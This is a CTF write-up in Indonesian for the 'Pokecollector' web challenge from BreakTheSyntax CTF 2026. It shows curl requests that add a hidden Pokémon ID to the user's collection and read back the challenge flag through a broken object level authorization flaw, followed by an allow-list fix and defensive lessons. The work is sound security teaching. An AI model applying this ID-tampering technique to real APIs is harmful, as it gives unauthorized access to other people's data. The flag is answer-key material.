---
ctf: "BreakTheSyntax CTF 2026 (BtSCTF)"
kategori: "Web Exploitation"
challenge: "Pokecollector"
flag: "BtSCTF{g1t_g0tt4_c4tch_3m_4ll}"
teknik: "IDOR lewat JWT yang menerbitkan-ulang dirinya sendiri; pokemon_id yang disuplai client diterima tanpa allow-list, nama server-side yang dikembalikan saat baca adalah flag-nya"
---

# Pokecollector — BreakTheSyntax CTF 2026 (Web Exploitation)

**Info soal:** Easy, target Web.

## Deskripsi Singkat

Soal ini persis berada di posisi nomor satu [OWASP API Top 10](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) — **API1:2023 Broken Object Level Authorization**. Aplikasinya menegakkan aturan akses di UI tapi lupa menegakkannya di API. Perbaikannya cuma satu validasi server-side; ongkos kalau terlewat adalah flag yang bocor.

## Recon — Aplikasinya

Sebuah web app bertema "gotta catch 'em all": register, login, klik tombol untuk menambahkan Pokémon ke koleksi, lihat koleksinya. Set Pokémon yang ditampilkan UI kecil saja — Pikachu, Charmander, beberapa lainnya — dan secara mencolok **tidak menyertakan Mewtwo (#150)**, legendary paling ikonik di Pokédex asli. Ketiadaan ini adalah umpan.

Melihat permukaan API lewat DevTools:

- `POST /api/collection/add` — body `{"pokemon_id": <int>, "pokemon_name": "<string>"}`. Kedua field disuplai client.
- `GET /api/collection` — mengembalikan `[{ "id": <int>, "name": "<string>" }, ...]`
- Setelah setiap add yang berhasil, server **menerbitkan-ulang JWT user** dengan koleksi terbaru tertanam di dalamnya.

Dua pilihan desain yang perlu diperhatikan:

1. Endpoint "catch" menerima ID integer mentah tanpa pengecekan allow-list apa pun.
2. JWT-nya menjadi *cerminan* dari ID apa pun yang berhasil dimasukkan user — tidak ada penyimpanan otoritatif kedua yang dicek server saat membaca data.

Kombinasi ini adalah keseluruhan bug-nya.

## Analisis

Uji cepat mengonfirmasi tidak adanya pengecekan tersebut. Setelah login, tukar ID bawaan UI dengan angka sembarang lalu kirim ulang:

```bash
$ curl -s -X POST https://challenge.local/api/collection/add \
       -H "Authorization: Bearer $JWT" \
       -H "Content-Type: application/json" \
       -d '{"pokemon_id": 25, "pokemon_name": "Pikachu"}'
{"token": "eyJhbGc...", "collection": [{"id":25,"name":"Pikachu"}]}
```

Responsnya menyertakan JWT baru dengan entri baru sudah ter-bake di dalamnya. Server bertindak sebagai otoritas atas apa yang dimiliki user — JWT *itu sendiri* adalah catatan koleksinya.

> **Kenapa JWT yang menerbitkan-diri-sendiri berbahaya sebagai penyimpan state:** Memperlakukan JWT sebagai sumber kebenaran atas apa yang dimiliki user adalah anti-pattern yang berulang. Token-nya memang ditandatangani (signed) — tapi *isinya* adalah apa pun yang terakhir kali dimasukkan server. Kalau jalur "memasukkan" milik server salah (seperti di sini), signature-nya hanya membuktikan bahwa server sendiri yang membuat klaim yang salah itu. State otoritatif seharusnya hidup di database; JWT seharusnya hanya merujuk ke situ, bukan mewujudkannya sendiri.

## Eksploitasi / Solusi

Submit `pokemon_id: 150` — ID yang disembunyikan UI:

```bash
$ curl -s -X POST https://challenge.local/api/collection/add \
       -H "Authorization: Bearer $JWT" \
       -H "Content-Type: application/json" \
       -d '{"pokemon_id": 150, "pokemon_name": "Mewtwo"}'
{"token": "eyJhbGc...","collection":[...,{"id":150,"name":"Mewtwo"}]}
```

Diterima. Sekarang ambil kembali koleksinya:

```bash
$ curl -s https://challenge.local/api/collection \
       -H "Authorization: Bearer $JWT" | jq '.collection[] | select(.id == 150)'
{
  "id": 150,
  "name": "BtSCTF{g1t_g0tt4_c4tch_3m_4ll}"
}
```

`pokemon_name` yang kita submit (`"Mewtwo"`) hanyalah umpan. Saat dibaca kembali, server menimpanya dengan nama kanoniknya sendiri dari data server-side — dan nama kanonik untuk #150 sudah ditukar jadi flag. Bug-nya bukan sekadar bahwa kita bisa menulis ID sembarang; tapi jalur baca yang dikontrol server itulah yang jadi kanal pengiriman rahasia-nya.

## Catatan / Insight

Kerentanan ini adalah **Broken Object Level Authorization** klasik dengan sedikit twist:

- *IDOR standar*: server mengembalikan objek yang ID-nya disuplai client, tanpa cek apakah user memilikinya.
- *Varian di soal ini*: server membiarkan client *memasukkan* ID objek sembarang ke koleksi milik user sendiri, lalu mengembalikan data server-side untuk ID itu saat dibaca.

Perbaikannya cuma satu pengecekan allow-list di endpoint "catch":

```python
ALLOWED_POKEMON_IDS = {1, 4, 7, 25, ...}    # ID yang benar-benar ditampilkan UI

@app.post("/api/collection/add")
def add(req, user):
    pokemon_id = req.json["pokemon_id"]
    if pokemon_id not in ALLOWED_POKEMON_IDS:
        return abort(403)
    user.collection.add(pokemon_id)
    ...
```

Perbaikan yang lebih mendalam sepenuhnya meninggalkan model "JWT sebagai penyimpan koleksi" — koleksi seharusnya berupa baris database, dan JWT hanya membawa identifier user. Menerbitkan-ulang token setiap kali ada perubahan state adalah tanda bahwa model data ini berada di tempat yang salah.

**Pelajaran lainnya:**

1. **UI bukan batas keamanan.** Apa pun yang dihilangkan UI tetap ada di ruang argumen API. Kalau kamu menemukan sebuah enumerasi yang ditampilkan ke user, coba *komplemennya* — ID yang sengaja disembunyikan UI seringkali justru harta karunnya.
2. **Identifier yang disuplai client selalu butuh otorisasi server-side.** "Apakah user ini memiliki / bisa mengakses / boleh mengoperasikan ID ini" adalah pengecekan yang harus hidup di server, di setiap endpoint, tanpa kecuali. OWASP API1:2023 adalah kerentanan API paling umum untuk tahun ketiga berturut-turut karena pengecekan ini rutin terlewat.
3. **JWT yang menerbitkan-diri-sendiri tidak bisa menegakkan otorisasi atas dirinya sendiri.** Apa pun yang dimasukkan server, server sendiri yang menandatanganinya. Kalau kamu mempercayai isi JWT saat membaca karena sudah ditandatangani, sebenarnya kamu sedang mempercayai jalur tulismu sendiri — artinya kamu cuma punya satu kesempatan memvalidasi input, yaitu saat menulis. Pengecekan defense-in-depth saat membaca terhadap penyimpanan otoritatif akan menangkap sisanya.
4. **Field umpan adalah sebuah sinyal.** Parameter `pokemon_name` sepenuhnya diabaikan — server menimpanya di setiap pembacaan. Ketika kamu melihat field yang sepertinya tidak dipakai server, cari field lain yang *memang* dipakai server tapi tidak ada di dokumentasi.

## Flag

```
BtSCTF{g1t_g0tt4_c4tch_3m_4ll}
```
